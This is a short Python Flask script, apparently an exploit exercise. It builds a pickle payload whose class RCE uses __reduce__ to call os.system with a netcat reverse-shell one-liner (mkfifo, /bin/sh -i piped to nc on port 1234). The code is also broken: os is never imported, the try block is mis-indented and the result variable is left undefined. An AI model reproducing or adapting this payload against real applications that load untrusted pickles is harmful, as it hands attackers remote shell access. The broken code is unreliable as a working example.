#! /usr/bin/python
from flask import Flask, render_template, request
import base64
import pickle

app = Flask(__name__)

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

@app.route('/')
def my_form():
    return render_template('home.html')


@app.route('/', methods=['POST'])
def my_form_post():
    try:
        
    pickled = pickle.dumps(RCE())
    
    
    except Exception as e:
        output = e
    return render_template('home.html', code=output)


if __name__ == "__main__":
    app.run(host='0.0.0.0')
